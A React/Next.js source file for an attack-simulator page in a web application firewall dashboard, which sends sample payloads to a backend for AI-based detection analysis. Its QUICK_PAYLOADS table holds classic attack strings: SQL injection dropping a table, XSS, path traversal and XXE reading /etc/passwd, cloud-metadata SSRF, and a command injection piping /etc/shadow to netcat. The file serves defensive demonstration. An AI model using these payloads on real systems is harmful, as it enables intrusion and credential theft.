// PATH: client/src/app/(dashboard)/simulate/page.tsx
'use client'
import { useState } from 'react'
import { useAuth } from '@/hooks/useAuth'

const API = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000/api'

interface SimStep {
    step: number
    label: string
    detail: string
    status: 'ok' | 'match' | 'blocked' | 'allowed'
    ms: number
}

interface SimResult {
    detected: boolean
    attackType: string
    confidence: number
    riskScore: number
    severity: string
    cvssScore: string
    affectedComponents: string[]
    mitreTechnique: string
    recommendation: string
    explanation: string
    steps: SimStep[]
    ip: string
    method: string
    endpoint: string
    country: string
    flag: string
    timestamp: string
    poweredBy: string
}

const ATTACK_TYPES = [
    { id: 'sqli',  label: 'SQL Injection',    icon: '🗄️',  color: '#1a6cff' },
    { id: 'xss',   label: 'XSS',              icon: '💉',  color: '#ef4444' },
    { id: 'path',  label: 'Path Traversal',   icon: '📂',  color: '#f59e0b' },
    { id: 'cmd',   label: 'Command Inject',   icon: '⚡',  color: '#a855f7' },
    { id: 'ssrf',  label: 'SSRF',             icon: '🌐',  color: '#06b6d4' },
    { id: 'xxe',   label: 'XXE',              icon: '📄',  color: '#f97316' },
    { id: 'csrf',  label: 'CSRF',             icon: '🔗',  color: '#22c55e' },
    { id: 'brute', label: 'Brute Force',      icon: '🔑',  color: '#8b5cf6' },
]

const QUICK_PAYLOADS: Record<string, string> = {
    sqli:  "' OR 1=1; DROP TABLE users;--",
    xss:   '<script>alert(document.cookie)</script>',
    path:  '../../../etc/passwd',
    cmd:   '; cat /etc/shadow | nc 10.0.0.1 4444',
    ssrf:  'http://169.254.169.254/latest/meta-data/iam/security-credentials',
    xxe:   '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    csrf:  '<form action="https://bank.com/transfer" method="POST"><input name="amount" value="9999"/></form>',
    brute: 'POST /admin/login [password=admin123, attempts=847]',
}

const QUICK_ENDPOINTS: Record<string, string> = {
    sqli:  '/api/products?search=',
    xss:   '/api/comments',
    path:  '/api/files/download',
    cmd:   '/api/ping',
    ssrf:  '/api/fetch-url',
    xxe:   '/api/xml-parser',
    csrf:  '/api/user/settings',
    brute: '/admin/login',
}

const SEVERITY_COLORS: Record<string, string> = {
    Critical: '#ef4444',
    High:     '#f59e0b',
    Medium:   '#1a6cff',
    Low:      '#22c55e',
}

const STEP_COLORS = {
    ok:      { dot: '#22c55e', bg: 'rgba(34,197,94,0.06)',  border: 'rgba(34,197,94,0.2)' },
    match:   { dot: '#f59e0b', bg: 'rgba(245,158,11,0.06)', border: 'rgba(245,158,11,0.2)' },
    blocked: { dot: '#ef4444', bg: 'rgba(239,68,68,0.06)',  border: 'rgba(239,68,68,0.2)' },
    allowed: { dot: '#22c55e', bg: 'rgba(34,197,94,0.06)',  border: 'rgba(34,197,94,0.2)' },
}

function StatPill({ label, value, color }: { label: string; value: string; color?: string }) {
    return (
        <div style={{
            background: 'var(--bg3)',
            border: '1px solid var(--border)',
            borderRadius: '10px',
            padding: '10px 14px',
            textAlign: 'center',
            minWidth: '80px',
        }}>
            <div style={{ fontSize: '10px', color: 'var(--text3)', letterSpacing: '0.5px', marginBottom: '3px' }}>{label}</div>
            <div style={{ fontSize: '15px', fontWeight: 700, color: color || 'var(--text)' }}>{value}</div>
        </div>
    )
}

function DetailRow({ label, value, color }: { label: string; value?: string; color?: string }) {
    return (
        <div>
            <div style={{ fontSize: '10px', color: 'var(--text3)', letterSpacing: '0.5px', marginBottom: '4px', textTransform: 'uppercase' }}>{label}</div>
            <div style={{ fontSize: '12px', color: color || 'var(--text)', fontWeight: color ? 600 : 400, wordBreak: 'break-word' }}>
                {value || '—'}
            </div>
        </div>
    )
}

export default function SimulatePage() {
    const { user, getToken } = useAuth()

    const [type,       setType]       = useState('sqli')
    const [endpoint,   setEndpoint]   = useState('/api/products?search=')
    const [method,     setMethod]     = useState('GET')
    const [payload,    setPayload]    = useState(QUICK_PAYLOADS['sqli'])
    const [running,    setRunning]    = useState(false)
    const [result,     setResult]     = useState<SimResult | null>(null)
    const [error,      setError]      = useState<string | null>(null)
    const [activeStep, setActiveStep] = useState(-1)

    function selectType(id: string) {
        setType(id)
        setPayload(QUICK_PAYLOADS[id] || '')
        setEndpoint(QUICK_ENDPOINTS[id] || '/api/endpoint')
        setResult(null)
        setError(null)
        setActiveStep(-1)
    }

    async function runSimulation() {
        if (!payload.trim()) return
        setRunning(true)
        setResult(null)
        setError(null)
        setActiveStep(-1)

        try {
            const token = getToken()
            const res = await fetch(`${API}/simulate`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    ...(token ? { Authorization: `Bearer ${token}` } : {}),
                },
                body: JSON.stringify({ type, endpoint, method, payload }),
            })

            const data = await res.json()
            if (!data.success) throw new Error(data.message || 'Simulation failed')

            const sim: SimResult = data.data
            setResult(sim)
            for (let i = 0; i < (sim.steps?.length || 0); i++) {
                setActiveStep(i)
                await new Promise(r => setTimeout(r, 500))
            }
        } catch (e: unknown) {
            setError(e instanceof Error ? e.message : 'Simulation failed')
        } finally {
            setRunning(false)
        }
    }

    return (
        <>
            <style>{`
                @keyframes spin { to { transform: rotate(360deg); } }
                @keyframes fadein { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }

                .sim-page {
                    padding: 20px 16px;
                    max-width: 1400px;
                    margin: 0 auto;
                    animation: fadein 0.2s ease;
                }

                /* Two-column layout on desktop */
                .sim-layout {
                    display: grid;
                    grid-template-columns: 360px 1fr;
                    gap: 18px;
                    align-items: start;
                }

                /* Attack type grid — 2 cols on mobile, 2 cols on desktop (narrow left panel) */
                .attack-grid {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 7px;
                }

                /* Stat pills row */
                .stat-pills {
                    display: flex;
                    gap: 8px;
                    flex-wrap: wrap;
                }

                /* Attack detail grid */
                .detail-grid {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 14px;
                }

                /* Tablet: 640–900px — left panel shrinks */
                @media (max-width: 900px) {
                    .sim-layout {
                        grid-template-columns: 300px 1fr;
                        gap: 14px;
                    }
                }

                /* Mobile: stack panels */
                @media (max-width: 640px) {
                    .sim-page {
                        padding: 14px 12px;
                    }
                    .sim-layout {
                        grid-template-columns: 1fr;
                        gap: 14px;
                    }
                    .attack-grid {
                        grid-template-columns: 1fr 1fr;
                        gap: 6px;
                    }
                    .detail-grid {
                        grid-template-columns: 1fr 1fr;
                        gap: 10px;
                    }
                    .stat-pills {
                        gap: 6px;
                    }
                }

                /* Very small screens */
                @media (max-width: 380px) {
                    .attack-grid {
                        grid-template-columns: 1fr 1fr;
                    }
                    .detail-grid {
                        grid-template-columns: 1fr;
                    }
                }
            `}</style>

            <div className="sim-page">
                {/* Header */}
                <div style={{ marginBottom: '20px' }}>
                    <h1 style={{ fontSize: '18px', fontWeight: 700, color: 'var(--text)', margin: 0, lineHeight: 1.3 }}>
                        Attack Simulator
                    </h1>
                    <p style={{ color: 'var(--text2)', fontSize: '12px', marginTop: '4px', margin: '4px 0 0' }}>
                        {user
                            ? '🤖 AI-powered via Gemini · Saved to MongoDB'
                            : '🔵 Demo mode · Login for real AI analysis'}
                    </p>
                </div>

                <div className="sim-layout">

                    {/* ── LEFT: Config Panel ── */}
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>

                        {/* Attack type selector */}
                        <div style={{
                            background: 'var(--bg2)',
                            border: '1px solid var(--border)',
                            borderRadius: '12px',
                            padding: '16px',
                        }}>
                            <div style={{
                                fontSize: '10px', fontWeight: 600,
                                color: 'var(--text3)', letterSpacing: '1px',
                                marginBottom: '10px', textTransform: 'uppercase',
                            }}>
                                Attack Type
                            </div>
                            <div className="attack-grid">
                                {ATTACK_TYPES.map(a => (
                                    <button
                                        key={a.id}
                                        onClick={() => selectType(a.id)}
                                        style={{
                                            background: type === a.id ? `${a.color}18` : 'var(--bg3)',
                                            border: `1px solid ${type === a.id ? a.color : 'var(--border)'}`,
                                            borderRadius: '8px',
                                            padding: '8px 10px',
                                            color: type === a.id ? a.color : 'var(--text2)',
                                            fontSize: '11.5px',
                                            fontWeight: type === a.id ? 600 : 400,
                                            cursor: 'pointer',
                                            display: 'flex',
                                            alignItems: 'center',
                                            gap: '5px',
                                            transition: 'all 0.15s ease',
                                            textAlign: 'left',
                                            width: '100%',
                                            boxSizing: 'border-box' as const,
                                            overflow: 'hidden',
                                        }}
                                    >
                                        <span style={{ fontSize: '13px', flexShrink: 0 }}>{a.icon}</span>
                                        <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                            {a.label}
                                        </span>
                                    </button>
                                ))}
                            </div>
                        </div>

                        {/* Config inputs */}
                        <div style={{
                            background: 'var(--bg2)',
                            border: '1px solid var(--border)',
                            borderRadius: '12px',
                            padding: '16px',
                            display: 'flex',
                            flexDirection: 'column',
                            gap: '12px',
                        }}>
                            <div style={{
                                fontSize: '10px', fontWeight: 600,
                                color: 'var(--text3)', letterSpacing: '1px',
                                textTransform: 'uppercase',
                            }}>
                                Request Config
                            </div>

                            <div>
                                <label style={{ fontSize: '10px', color: 'var(--text3)', marginBottom: '5px', display: 'block', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                                    Method
                                </label>
                                <select
                                    value={method}
                                    onChange={e => setMethod(e.target.value)}
                                    className="inp"
                                    style={{ width: '100%', boxSizing: 'border-box' }}
                                >
                                    {['GET', 'POST', 'PUT', 'DELETE', 'PATCH'].map(m => (
                                        <option key={m} value={m}>{m}</option>
                                    ))}
                                </select>
                            </div>

                            <div>
                                <label style={{ fontSize: '10px', color: 'var(--text3)', marginBottom: '5px', display: 'block', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                                    Endpoint
                                </label>
                                <input
                                    className="inp"
                                    style={{ width: '100%', boxSizing: 'border-box' }}
                                    value={endpoint}
                                    onChange={e => setEndpoint(e.target.value)}
                                    placeholder="/api/endpoint"
                                />
                            </div>

                            <div>
                                <label style={{ fontSize: '10px', color: 'var(--text3)', marginBottom: '5px', display: 'block', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                                    Payload
                                    <span
                                        onClick={() => setPayload(QUICK_PAYLOADS[type] || '')}
                                        style={{ marginLeft: '8px', color: '#1a6cff', cursor: 'pointer', fontWeight: 400, textTransform: 'none', letterSpacing: 0 }}
                                    >
                                        ↺ Reset
                                    </span>
                                </label>
                                <textarea
                                    className="inp mono"
                                    style={{
                                        width: '100%',
                                        minHeight: '80px',
                                        resize: 'vertical',
                                        boxSizing: 'border-box',
                                        fontSize: '12px',
                                        lineHeight: '1.5',
                                    }}
                                    value={payload}
                                    onChange={e => setPayload(e.target.value)}
                                    placeholder="Enter attack payload..."
                                />
                            </div>

                            <button
                                onClick={runSimulation}
                                disabled={running || !payload.trim()}
                                style={{
                                    background: running ? 'var(--bg3)' : '#1a6cff',
                                    color: running ? 'var(--text3)' : '#fff',
                                    border: 'none',
                                    borderRadius: '8px',
                                    padding: '12px',
                                    fontSize: '13px',
                                    fontWeight: 600,
                                    cursor: running ? 'not-allowed' : 'pointer',
                                    transition: 'all 0.15s ease',
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    gap: '8px',
                                    width: '100%',
                                }}
                            >
                                {running ? (
                                    <>
                                        <span style={{
                                            width: '13px', height: '13px',
                                            border: '2px solid var(--text3)',
                                            borderTop: '2px solid #1a6cff',
                                            borderRadius: '50%',
                                            display: 'inline-block',
                                            animation: 'spin 0.8s linear infinite',
                                            flexShrink: 0,
                                        }} />
                                        Analyzing...
                                    </>
                                ) : '⚡ Run Simulation'}
                            </button>
                        </div>
                    </div>

                    {/* ── RIGHT: Result Panel ── */}
                    <div style={{ minWidth: 0 }}>

                        {/* Idle state */}
                        {!result && !running && !error && (
                            <div style={{
                                background: 'var(--bg2)',
                                border: '1px solid var(--border)',
                                borderRadius: '12px',
                                padding: '48px 24px',
                                textAlign: 'center',
                            }}>
                                <div style={{ fontSize: '40px', marginBottom: '14px' }}>🛡️</div>
                                <div style={{ color: 'var(--text)', fontWeight: 600, marginBottom: '6px', fontSize: '14px' }}>
                                    Ready to Analyze
                                </div>
                                <div style={{ color: 'var(--text2)', fontSize: '12px', maxWidth: '260px', margin: '0 auto', lineHeight: 1.6 }}>
                                    Select an attack type, configure the request, and click Run Simulation.
                                    {user && ' Results are powered by Gemini AI.'}
                                </div>
                            </div>
                        )}

                        {/* Error state */}
                        {error && (
                            <div style={{
                                background: 'rgba(239,68,68,0.06)',
                                border: '1px solid rgba(239,68,68,0.25)',
                                borderRadius: '12px',
                                padding: '20px',
                                color: '#ef4444',
                                fontSize: '13px',
                                lineHeight: 1.5,
                            }}>
                                ❌ {error}
                            </div>
                        )}

                        {/* Loading spinner */}
                        {running && !result && (
                            <div style={{
                                background: 'var(--bg2)',
                                border: '1px solid var(--border)',
                                borderRadius: '12px',
                                padding: '40px 24px',
                                textAlign: 'center',
                            }}>
                                <div style={{
                                    width: '36px', height: '36px',
                                    border: '3px solid var(--border)',
                                    borderTop: '3px solid #1a6cff',
                                    borderRadius: '50%',
                                    animation: 'spin 0.8s linear infinite',
                                    margin: '0 auto 14px',
                                }} />
                                <div style={{ color: 'var(--text)', fontWeight: 600, fontSize: '13px' }}>Running AI Analysis</div>
                                <div style={{ color: 'var(--text2)', fontSize: '11px', marginTop: '4px' }}>
                                    Querying Gemini AI…
                                </div>
                            </div>
                        )}

                        {/* Results */}
                        {result && (
                            <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', animation: 'fadein 0.2s ease' }}>

                                {/* Verdict banner */}
                                <div style={{
                                    background: result.detected
                                        ? 'rgba(239,68,68,0.06)'
                                        : 'rgba(34,197,94,0.06)',
                                    border: `1px solid ${result.detected ? 'rgba(239,68,68,0.3)' : 'rgba(34,197,94,0.3)'}`,
                                    borderRadius: '12px',
                                    padding: '16px 18px',
                                }}>
                                    {/* Top row: icon + title + pills */}
                                    <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px', flexWrap: 'wrap' }}>
                                        <span style={{ fontSize: '28px', lineHeight: 1, flexShrink: 0 }}>
                                            {result.detected ? '🚫' : '✅'}
                                        </span>
                                        <div style={{ flex: 1, minWidth: '120px' }}>
                                            <div style={{
                                                fontSize: '15px',
                                                fontWeight: 700,
                                                color: result.detected ? '#ef4444' : '#22c55e',
                                                marginBottom: '2px',
                                            }}>
                                                {result.detected ? 'ATTACK BLOCKED' : 'REQUEST ALLOWED'}
                                            </div>
                                            <div style={{ fontSize: '11px', color: 'var(--text2)', lineHeight: 1.4 }}>
                                                {result.attackType} · {result.flag} {result.country} · {result.ip}
                                            </div>
                                        </div>
                                    </div>

                                    {/* Stat pills below */}
                                    <div className="stat-pills" style={{ marginTop: '12px' }}>
                                        <StatPill label="Risk Score"  value={`${result.riskScore}/100`} color={result.detected ? '#ef4444' : '#22c55e'} />
                                        <StatPill label="CVSS"        value={result.cvssScore}           color={SEVERITY_COLORS[result.severity] || '#8899b0'} />
                                        <StatPill label="Confidence"  value={`${result.confidence}%`}    color="#1a6cff" />
                                    </div>
                                </div>

                                {/* AI badge */}
                                <div style={{
                                    display: 'flex', alignItems: 'center', gap: '6px',
                                    fontSize: '10px', color: '#1a6cff', fontWeight: 700,
                                    letterSpacing: '0.5px', flexWrap: 'wrap',
                                }}>
                                    <span>🤖</span>
                                    <span>POWERED BY {result.poweredBy?.toUpperCase() || 'AI ENGINE'}</span>
                                    <span style={{ color: 'var(--text3)', fontWeight: 400, letterSpacing: 0 }}>
                                        · {new Date(result.timestamp).toLocaleTimeString()}
                                    </span>
                                </div>

                                {/* AI Explanation */}
                                <div style={{
                                    background: 'var(--bg2)',
                                    border: '1px solid var(--border)',
                                    borderLeft: '3px solid #1a6cff',
                                    borderRadius: '10px',
                                    padding: '14px 16px',
                                }}>
                                    <div style={{
                                        fontSize: '10px', fontWeight: 700,
                                        letterSpacing: '1px', color: '#1a6cff',
                                        marginBottom: '8px', textTransform: 'uppercase',
                                    }}>
                                        AI Analysis
                                    </div>
                                    <p style={{
                                        color: 'var(--text)', fontSize: '13px',
                                        lineHeight: '1.7', margin: 0,
                                        wordBreak: 'break-word',
                                    }}>
                                        {result.explanation}
                                    </p>
                                </div>

                                {/* Attack details */}
                                <div style={{
                                    background: 'var(--bg2)',
                                    border: '1px solid var(--border)',
                                    borderRadius: '10px',
                                    padding: '14px 16px',
                                }}>
                                    <div className="detail-grid">
                                        <DetailRow label="Severity"   value={result.severity}                        color={SEVERITY_COLORS[result.severity]} />
                                        <DetailRow label="MITRE"      value={result.mitreTechnique} />
                                        <DetailRow label="Components" value={result.affectedComponents?.join(', ')} />
                                        <DetailRow label="Method"     value={`${result.method} ${result.endpoint}`} />
                                    </div>
                                </div>

                                {/* Recommendation */}
                                <div style={{
                                    background: result.detected ? 'rgba(245,158,11,0.05)' : 'rgba(34,197,94,0.05)',
                                    border: `1px solid ${result.detected ? 'rgba(245,158,11,0.2)' : 'rgba(34,197,94,0.2)'}`,
                                    borderRadius: '10px',
                                    padding: '14px 16px',
                                    display: 'flex',
                                    gap: '10px',
                                    alignItems: 'flex-start',
                                }}>
                                    <span style={{ fontSize: '16px', flexShrink: 0 }}>💡</span>
                                    <div style={{ minWidth: 0 }}>
                                        <div style={{
                                            fontSize: '10px', fontWeight: 700,
                                            color: result.detected ? '#f59e0b' : '#22c55e',
                                            letterSpacing: '1px', marginBottom: '4px',
                                            textTransform: 'uppercase',
                                        }}>
                                            Recommendation
                                        </div>
                                        <div style={{
                                            color: 'var(--text)', fontSize: '13px',
                                            lineHeight: 1.6, wordBreak: 'break-word',
                                        }}>
                                            {result.recommendation}
                                        </div>
                                    </div>
                                </div>

                                {/* WAF Processing Steps */}
                                <div style={{
                                    background: 'var(--bg2)',
                                    border: '1px solid var(--border)',
                                    borderRadius: '10px',
                                    padding: '16px',
                                }}>
                                    <div style={{
                                        fontSize: '10px', fontWeight: 700,
                                        letterSpacing: '1px', color: 'var(--text2)',
                                        marginBottom: '12px', textTransform: 'uppercase',
                                    }}>
                                        WAF Processing Steps
                                    </div>
                                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                                        {result.steps?.map((step, i) => {
                                            const colors  = STEP_COLORS[step.status] || STEP_COLORS.ok
                                            const visible  = i <= activeStep
                                            return (
                                                <div
                                                    key={step.step}
                                                    style={{
                                                        background: visible ? colors.bg : 'var(--bg3)',
                                                        border: `1px solid ${visible ? colors.border : 'var(--border)'}`,
                                                        borderRadius: '8px',
                                                        padding: '9px 12px',
                                                        display: 'flex',
                                                        alignItems: 'flex-start',
                                                        gap: '10px',
                                                        opacity: visible ? 1 : 0.3,
                                                        transition: 'all 0.3s ease',
                                                    }}
                                                >
                                                    <span style={{
                                                        width: '7px', height: '7px',
                                                        borderRadius: '50%',
                                                        background: visible ? colors.dot : 'var(--text3)',
                                                        flexShrink: 0,
                                                        marginTop: '3px',
                                                        boxShadow: visible ? `0 0 5px ${colors.dot}66` : 'none',
                                                    }} />
                                                    <div style={{ flex: 1, minWidth: 0 }}>
                                                        <div style={{
                                                            fontSize: '12px', fontWeight: 600,
                                                            color: 'var(--text)', lineHeight: 1.3,
                                                        }}>
                                                            {step.label}
                                                        </div>
                                                        <div style={{
                                                            fontSize: '11px', color: 'var(--text2)',
                                                            marginTop: '2px', lineHeight: 1.4,
                                                            wordBreak: 'break-word',
                                                        }}>
                                                            {step.detail}
                                                        </div>
                                                    </div>
                                                    {step.ms > 0 && (
                                                        <span className="mono" style={{
                                                            fontSize: '10px', color: 'var(--text3)',
                                                            flexShrink: 0, paddingTop: '2px',
                                                        }}>
                                                            {step.ms}ms
                                                        </span>
                                                    )}
                                                </div>
                                            )
                                        })}
                                    </div>
                                </div>

                            </div>
                        )}
                    </div>
                </div>
            </div>
        </>
    )
}